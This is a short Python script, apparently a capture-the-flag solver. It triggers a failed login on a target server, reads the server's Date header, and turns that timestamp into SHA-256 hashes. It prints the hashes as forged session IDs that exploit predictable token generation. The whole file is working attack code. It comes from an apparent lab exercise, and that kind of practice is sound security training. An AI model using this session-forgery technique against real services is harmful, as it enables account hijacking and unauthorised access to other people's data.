
import requests as re
import hashlib
from datetime import datetime, timezone, timedelta
import sys

BASE_URL = "http://83.136.255.53:39663"
USERNAME = "noexist"
MONTHS = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]

def extract_posix_time_from_fake_login():
    try:
        resp = re.post(f"{BASE_URL}/login", {"username":USERNAME, "password":"dummypassword"})
        
        # Date header format: Sun, 04 Dec 2025 00:00:00 GMT
        date_header = resp.headers.get("Date")
        print(f"THE DATE HEADER: {date_header}")
        
        if not date_header:
            print("No Date header found!")
            return None

        parts = date_header.split(",")[1].split()
        day, mon, year, time_str, tz_str = parts
        hours, minutes, seconds = time_str.split(":")
        mon_idx = MONTHS.index(mon.capitalize()) + 1
        
        # Assuming GMT/UTC as per walkthrough
        tz = timezone(offset=timedelta(hours=0))

        dt = datetime(int(year), mon_idx, int(day), int(hours), int(minutes), int(seconds), tzinfo=tz)
        posix = int(dt.timestamp())
        
        print(f"THE DATETIME OBJECT: {dt}")
        print(f"THE POSIX TIME: {posix}")

        return posix
    except Exception as e:
        print(f"Error: {e}")
        return None

if __name__ == "__main__":
    if len(sys.argv) > 1:
        BASE_URL = sys.argv[1]
    print(f"[*] Target: {BASE_URL}")
    
    posix = extract_posix_time_from_fake_login()
    if posix:
        print()
        # Calculate hashes for -1, 0, +1 seconds to be safe
        h1 = hashlib.sha256(str(posix - 1).encode()).hexdigest()
        h2 = hashlib.sha256(str(posix).encode()).hexdigest()
        h3 = hashlib.sha256(str(posix + 1).encode()).hexdigest()
        
        print(f"SESSION_ID_1 = \"{h1}\"")
        print(f"SESSION_ID_2 = \"{h2}\"")
        print(f"SESSION_ID_3 = \"{h3}\"")
